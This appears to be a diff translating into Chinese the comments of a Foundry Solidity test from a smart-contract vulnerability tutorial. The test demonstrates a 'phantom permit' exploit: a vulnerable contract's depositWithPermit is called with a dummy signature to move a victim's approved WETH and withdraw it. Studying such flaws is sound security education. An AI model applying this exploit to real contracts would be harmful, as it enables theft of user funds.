@@ -47,38 +47,38 @@ contract WETH9 {
 
 ***\*测试方法:\****
 
-仿真测试 --contracts src/test/**phantom-permit.sol** -vvvv
+forge test --contracts src/test/**phantom-permit.sol** -vvvv
 
 ```jsx
-// Function to test phantom permit vulnerability
+// 测试幻像许可证漏洞的函数
     function testVulnPhantomPermit() public {
-        // Alice's address is set as the first address in the virtual machine
+        // Alice的地址被设置为虚拟机中的第一个地址
         address alice = vm.addr(1);
         
-        // Transfers 10 Ether to Alice's account
+        // 转10个以太币到Alice的账户
         vm.deal(address(alice), 10 ether);
 
-        // Initiates a "prank" on Alice's account in the virtual machine
-        // It's unclear what this prank does without further context
+        // 在虚拟机中对 Alice 的帐户发起“恶作剧”
+         // 如果没有进一步的上下文，还不清楚这个恶作剧的作用
         vm.startPrank(alice);
         
-        // Deposits 10 Ether into WETH9Contract from the current contract
+        // 从当前合约中将 10 以太币存入 WETH9Contract
         WETH9Contract.deposit{value: 10 ether}();
         
-        // Approves the Vulnerable Permit Contract to spend the maximum possible amount of tokens (WETH in this case) on behalf of this contract
+        // 批准漏洞许可合约代表该合约花费最大可能数量的代币（本例中为 WETH）
         WETH9Contract.approve(address(VulnPermitContract), type(uint256).max);
         
-        // Stops the prank on Alice's account
+        //停止对 Alice 帐户的恶作剧
         vm.stopPrank();
         
-        // Logs the balance of this contract in the WETH9Contract
+        // 在 WETH9Contract 中记录该合约的余额
         console.log(
             "start WETH balanceOf this",
             WETH9Contract.balanceOf(address(this))
         );
 
-        // Makes a deposit in the Vulnerable Permit Contract on behalf of Alice using a permit
-        // The parameters for v, r, s (27, 0x0, 0x0 here) are part of the ECDSA signature scheme for the permit
+        //使用许可证代表 Alice 在易受攻击的许可证合约中存入存款
+         // v、r、s 的参数（此处为 27、0x0、0x0）是许可证的 ECDSA 签名方案的一部分
         VulnPermitContract.depositWithPermit(
             address(alice),
             1000,
@@ -87,14 +87,14 @@ contract WETH9 {
             0x0
         );
         
-        // Gets the balance of the Vulnerable Permit Contract in WETH and logs it
+        // 获取 WETH 中漏洞许可合约的余额并记录
         uint wbal = WETH9Contract.balanceOf(address(VulnPermitContract));
         console.log("WETH balanceOf VulnPermitContract", wbal);
 
-        // Withdraws 1000 tokens from the Vulnerable Permit Contract
+        // 从漏洞许可合约中提取 1000 个代币
         VulnPermitContract.withdraw(1000);
 
-        // Gets the balance of this contract in WETH after the withdrawal and logs it
+        // 获取提现后该合约的 WETH 余额并记录
         wbal = WETH9Contract.balanceOf(address(this));
         console.log("WETH9Contract balanceOf this", wbal);
     }
